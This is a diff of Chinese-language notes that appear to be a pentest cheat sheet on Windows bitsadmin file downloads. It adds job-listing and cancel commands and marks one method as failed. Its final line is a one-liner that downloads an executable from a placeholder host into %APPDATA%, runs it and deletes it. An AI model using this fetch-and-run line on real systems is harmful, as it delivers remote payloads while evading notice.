@@ -14,7 +14,7 @@ https://xz.aliyun.com/t/1654/
 
 ```bitsadmin /transfer myDownLoadJob /download /priority normal "http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg" "e:\abc.jpg"```
 
-4.多条命令
+4.多条命令(测试失败)
  
 ``` 
 bitsadmin /create myDownloadJob
@@ -24,5 +24,10 @@ bitsadmin /info myDownloadJob /verbose
 bitsadmin /complete myDownloadJob
 ```
 
+列出所有任务：
+
+bitsadmin /list /allusers /verbose  #如果列所有用户需管理员权限
+bitsadmin /list /verbose
+bitsadmin /cancel myDownloadJob   #删除某个任务
 
 bitsadmin /transfer d90f <http://site.com/a> %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe
